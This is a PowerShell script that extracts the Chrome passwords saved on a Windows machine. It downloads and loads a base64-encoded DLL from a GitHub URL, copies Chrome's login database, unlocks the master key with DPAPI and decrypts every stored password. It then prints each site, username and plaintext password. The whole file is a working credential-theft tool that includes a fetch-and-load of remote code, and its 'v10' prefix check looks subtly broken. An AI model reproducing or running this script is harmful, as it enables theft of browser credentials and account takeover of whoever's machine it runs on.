# Load required assemblies
Add-Type -AssemblyName System.Security.Cryptography.ProtectedData
Add-Type -AssemblyName System.Text.Encoding

# Download and load SQLite assembly securely
$uri = "https://raw.githubusercontent.com/TimSchellin/Extract-ChromePasswords/master/SQLite_assembly.txt"
$assemblyPath = "$env:LOCALAPPDATA\System.Data.SQLite.dll"

if (-not (Test-Path $assemblyPath)) {
    $assemblyBase64 = Invoke-RestMethod -Uri $uri
    $bytes = [Convert]::FromBase64String($assemblyBase64)
    [IO.File]::WriteAllBytes($assemblyPath, $bytes)
}

Add-Type -Path $assemblyPath

# Paths
$loginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"

# Copy DB to avoid lock issues
$tmpDb = [System.IO.Path]::GetTempFileName()
Copy-Item $loginData $tmpDb -Force

try {
    # Read master key
    $json = Get-Content $localState -Raw | ConvertFrom-Json
    $encryptedKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)
    $masterKey = [Security.Cryptography.ProtectedData]::Unprotect($encryptedKey[5..$encryptedKey.Length], $null, 'CurrentUser')

    # Open DB
    $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmpDb; Version=3;")
    $conn.Open()
    $cmd = $conn.CreateCommand()
    $cmd.CommandText = "SELECT username_value, password_value, action_url FROM logins"

    $reader = $cmd.ExecuteReader()
    while ($reader.Read()) {
        $username = $reader.GetString(0)
        $purl = $reader.GetString(2)
        $passwordValue = $reader.GetValue(1)

        if ($passwordValue[0..2] -join '' -eq [Text.Encoding]::ASCII.GetBytes('v10')) {
            # AES-GCM decryption
            $iv = $passwordValue[3..14]
            $ciphertext = $passwordValue[15..($passwordValue.Length - 17)]
            $tag = $passwordValue[($passwordValue.Length - 16)..($passwordValue.Length - 1)]

            $cipher = New-Object System.Security.Cryptography.AesGcm $masterKey
            $plaintextBytes = New-Object byte[] ($ciphertext.Length)
            $success = $cipher.Decrypt($iv, $ciphertext, $tag, $plaintextBytes)
            $plaintext = [Text.Encoding]::UTF8.GetString($plaintextBytes)
        } else {
            # DPAPI decryption (legacy)
            $plaintextBytes = [Security.Cryptography.ProtectedData]::Unprotect($passwordValue, $null, 'CurrentUser')
            $plaintext = [Text.Encoding]::UTF8.GetString($plaintextBytes)
        }

        Write-Output "Site: $purl`nUsername: $username`nPassword: $plaintext`n"
    }
    $reader.Close()
} finally {
    $conn?.Close()
    Remove-Item $tmpDb -Force
}
